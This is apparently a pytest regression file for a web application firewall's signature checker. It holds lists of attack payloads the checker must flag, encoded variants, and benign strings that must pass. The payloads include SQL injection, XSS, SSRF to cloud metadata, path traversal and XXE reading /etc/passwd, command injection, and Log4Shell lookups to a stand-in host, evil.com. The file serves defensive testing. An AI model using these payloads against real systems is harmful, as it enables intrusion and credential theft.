"""Regression tests for the signature stage. Run with:  python -m pytest tests -q
(or without pytest:  python tests/test_signatures.py)"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from src.hybrid_waf.utils.signature_checker import inspect  # noqa: E402

# (payload, expected category) -> must be blocked by a signature rule on the raw text
ATTACKS = [
    ("GET /search?q=' OR '1'='1'; DROP TABLE users;-- HTTP/1.1", "SQLi"),
    ("1' UNION SELECT username,password FROM users--", "SQLi"),
    ("admin'--", "SQLi"),
    ("1 AND SLEEP(5)", "SQLi"),
    ("1; WAITFOR DELAY '0:0:5'", "SQLi"),
    ("1 OR 1=1", "SQLi"),
    ("1'/**/OR/**/'1'='1", "SQLi"),
    ("GET /comment?text=<script>alert('XSS')</script> HTTP/1.1", "XSS"),
    ("<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>", "XSS"),
    ("<img src=x onerror=alert(1)>", "XSS"),
    ("<svg onload=alert(1)>", "XSS"),
    ("javascript:alert(document.cookie)", "XSS"),
    ("<iframe src=http://evil.com></iframe>", "HTML Injection"),
    ("<h1>hacked</h1>", "HTML Injection"),
    ("http://localhost/admin", "SSRF"),
    ("http://169.254.169.254/latest/meta-data/", "SSRF"),
    ("file:///etc/passwd", "SSRF"),
    ("http://192.168.1.10/router", "SSRF"),
    ("../../etc/passwd", "Path Traversal"),
    ("..\\..\\windows\\win.ini", "Path Traversal"),
    ("; cat /etc/passwd", "Command Injection"),
    ("| ls -la", "Command Injection"),
    ("&& whoami", "Command Injection"),
    ("$(id)", "Command Injection"),
    ("${jndi:ldap://evil.com/a}", "Log4Shell"),
    ("${${lower:j}ndi:ldap://evil.com/a}", "Log4Shell"),
    ("{{7*7}}", "SSTI"),
    ("{{config.__class__}}", "SSTI"),
    ('{"username": {"$ne": null}}', "NoSQLi"),
    ("user[$ne]=x", "NoSQLi"),
    ("<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>", "XXE"),
    ("*)(uid=*))(|(uid=*", "LDAP Injection"),
]

# README "ML" examples: must be 'obfuscated' (so they still reach the ML model)
OBFUSCATED = [
    "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1",
    "GET /search?q=\\x27\\x20OR\\x20\\x31\\x3D\\x31 HTTP/1.1",
    "GET /comment?text=<details%20open%20ontoggle=Function('ale'+'rt(1)')()> HTTP/1.1",
    "GET /comment?text=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1",
]

# Encoded attacks: obfuscated verdict AND the decoded text must reveal the category
ENCODED_ATTACKS = [
    ("%27%20OR%20%271%27%3D%271", "SQLi"),
    ("%3Cscript%3Ealert(1)%3C%2Fscript%3E", "XSS"),
    ("%252e%252e%252f%252e%252e%252fetc%252fpasswd", "Path Traversal"),   # double-encoded
    ("%24%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fa%7D", "Log4Shell"),
    ("&lt;script&gt;x&lt;/script&gt;", "XSS"),
]

# Harmless inputs: must be 'valid' (includes the false positives found in the old rules)
BENIGN = [
    "GET / HTTP/1.1\nHost: www.example.com",
    "GET /products?category=electronics&page=2 HTTP/1.1\nHost: www.ecommerce.com\nReferer: https://www.ecommerce.com/products",
    "GET /product/12345 HTTP/1.1\nHost: www.ecommerce.com",
    'POST /cart/add HTTP/1.1\nContent-Type: application/json\n\n{"productId": "12345", "quantity": 1}',
    "hello world",
    "my name=john",
    "I want to update my aws account",
    "use the internal link",
    "# heading",
    "Please select the best option from the list",
    "Remember: this is the first case, then the second",
    "The alert came late",
    "python is great; so is java",
    "It costs 5 < 10 dollars and a < b",
    "order by the end of the week",
    "online=true&user=sam",
    "I'd like to see the script of the movie",
    "token expired, please log in again",
    "What's 7*7?",
    '{"color": "#fff", "note": "run `npm install` then start"}',
    "GET /static/app.css?v=3 HTTP/1.1",
]


def test_attacks_blocked():
    for text, category in ATTACKS:
        r = inspect(text)
        assert r["verdict"] == "malicious", f"MISSED: {text!r} -> {r}"
        assert r["category"] == category, f"WRONG CATEGORY: {text!r} -> {r['category']} (want {category})"


def test_readme_ml_examples_still_reach_ml():
    for text in OBFUSCATED:
        assert inspect(text)["verdict"] == "obfuscated", f"{text!r} -> {inspect(text)}"


def test_encoded_attacks_identified():
    for text, category in ENCODED_ATTACKS:
        r = inspect(text)
        assert r["verdict"] == "obfuscated", f"{text!r} -> {r}"
        assert r["category"] == category, f"{text!r} -> {r['category']} (want {category})"


def test_benign_allowed():
    for text in BENIGN:
        r = inspect(text)
        assert r["verdict"] == "valid", f"FALSE POSITIVE: {text!r} -> {r['verdict']} {r['rule_id']}"


if __name__ == "__main__":
    fails = 0
    for fn in (test_attacks_blocked, test_readme_ml_examples_still_reach_ml,
               test_encoded_attacks_identified, test_benign_allowed):
        try:
            fn(); print("PASS", fn.__name__)
        except AssertionError as e:
            fails += 1; print("FAIL", fn.__name__, "\n  ", e)
    sys.exit(1 if fails else 0)
